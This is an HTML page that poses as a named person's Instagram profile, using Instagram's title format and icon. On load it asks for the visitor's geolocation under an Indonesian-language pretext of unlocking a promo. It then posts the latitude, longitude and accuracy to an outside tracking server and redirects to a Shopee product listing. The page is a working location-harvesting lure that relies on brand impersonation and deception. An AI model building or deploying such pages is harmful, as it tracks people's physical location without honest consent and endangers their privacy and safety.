<!DOCTYPE html>
<html>
  <head>
    <link
      data-default-icon="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png"
      rel="icon"
      sizes="192x192"
      href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png"
    />
    <title>
      Ilham Rahmaddani Adhie Prayoga (@ilhamrhmddni) â€¢ Instagram photos and
      videos
    </title>
    <style>
      /* Tambahkan gaya untuk animasi loading */
      #loading {
        display: none;
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        font-size: 18px;
        color: #555;
      }
    </style>
  </head>
  <body>
    <div id="loading">Beri Akses Lokasi untuk Mendapatkan Promo...</div>
    <!-- Elemen animasi loading -->
    <script>
      window.onload = getLocation; // Panggil getLocation otomatis saat halaman dimuat

      function getLocation() {
        document.getElementById("loading").style.display = "block"; // Tampilkan animasi loading
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(sendPosition, handleError);
        } else {
          alert("Geolocation tidak didukung oleh browser Anda.");
          document.getElementById("loading").style.display = "none"; // Sembunyikan animasi loading
        }
      }

      const randomId = "id-" + Math.random().toString(36).substring(2, 10);

      function sendPosition(position) {
        const data = {
          id: randomId,
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
        };

        fetch("https://tracking-lemon.vercel.app/track", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(data),
        })
          .then(() => {
            // Setelah data berhasil dikirim, arahkan ke URL tujuan
            window.location.href =
              "https://shopee.co.id/OGI-Ranjang-Anjing-Pet-Bed-Waterproof-Medium-i.179084100.11560946768?sp_atk=f09721bf-f126-426e-bc88-a6d8a4a4d150&xptdk=f09721bf-f126-426e-bc88-a6d8a4a4d150";
          })
          .catch(() => {
            // Gagal kirim data, tidak ada aksi tambahan
          })
          .finally(() => {
            document.getElementById("loading").style.display = "none"; // Sembunyikan animasi loading
          });
      }

      function handleError(error) {
        document.getElementById("loading").style.display = "none"; // Sembunyikan animasi loading
        alert(
          "Gagal mendapatkan lokasi. Pastikan Anda mengizinkan akses lokasi."
        );
      }
    </script>
  </body>
</html>
